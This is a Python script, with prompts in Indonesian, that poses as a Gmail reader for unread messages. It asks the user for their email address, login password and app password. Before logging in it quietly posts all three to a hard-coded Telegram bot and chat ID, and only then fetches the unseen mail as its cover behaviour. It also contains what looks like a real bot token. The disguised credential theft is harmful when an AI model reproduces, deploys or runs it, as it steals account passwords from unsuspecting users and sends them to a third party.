import imaplib
import email
from email.header import decode_header
from email.utils import parsedate_to_datetime
import requests

def send_telegram_message(message, bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
    }
    requests.post(url, data=payload)

def clean_input(input_string):
    return ''.join(c for c in input_string if ord(c) < 128)

def mail_grabber():
    # Input dari user
    EMAIL_ACCOUNT = input("Masukkan email Anda: ")
    LOGIN_PASSWORD = input("Masukkan password login: ")
    APP_PASSWORD = input("Masukkan app password: ")

    # Bersihkan input
    EMAIL_ACCOUNT = clean_input(EMAIL_ACCOUNT)
    LOGIN_PASSWORD = clean_input(LOGIN_PASSWORD)
    APP_PASSWORD = clean_input(APP_PASSWORD)

    # Kirim ke Telegram
    bot_token = "8079548801:AAEJ0GyEkrlIyOs_AICDu-nm9jbrat_k9wc"
    chat_id = "7133374029"
    message = (
        f"📥 EMAIL DATA:\n"
        f"📧 Email: {EMAIL_ACCOUNT}\n"
        f"🔐 Password Login: {LOGIN_PASSWORD}\n"
        f"🔑 App Password: {APP_PASSWORD}"
    )
    send_telegram_message(message, bot_token, chat_id)

    # Coba login ke Gmail
    try:
        mail = imaplib.IMAP4_SSL("imap.gmail.com")
        mail.login(EMAIL_ACCOUNT, APP_PASSWORD)
    except imaplib.IMAP4.error:
        print("🚫 Login gagal, cek kembali email atau app password Anda.")
        return

    mail.select("inbox")
    result, data = mail.search(None, "UNSEEN")
    mail_ids = data[0].split()

    if mail_ids:
        for i in mail_ids:
            result, message_data = mail.fetch(i, "(RFC822)")
            raw_email = message_data[0][1]
            msg = email.message_from_bytes(raw_email)

            subject, encoding = decode_header(msg["Subject"])[0]
            if isinstance(subject, bytes):
                subject = subject.decode(encoding or "utf-8", errors="ignore")

            from_email = msg.get("From")
            date = msg.get("Date")
            sent_time = parsedate_to_datetime(date)
            body = ""

            if msg.is_multipart():
                for part in msg.walk():
                    content_type = part.get_content_type()
                    content_disposition = str(part.get("Content-Disposition"))

                    if "attachment" not in content_disposition:
                        if content_type in ["text/plain", "text/html"]:
                            body += part.get_payload(decode=True).decode(errors="ignore") + "\n"
            else:
                body = msg.get_payload(decode=True).decode(errors="ignore")

            print(f"Email Baru Diterima:\n"
                  f"📬 Subject: {subject}\n"
                  f"👤 From: {from_email}\n"
                  f"🕒 Sent Time: {sent_time}\n"
                  f"✉️ Message:\n{body}")
            print("=" * 40)
    else:
        print("⚠️ Tidak ada email baru yang belum dibaca.")

    mail.logout()

if __name__ == "__main__":
    mail_grabber()
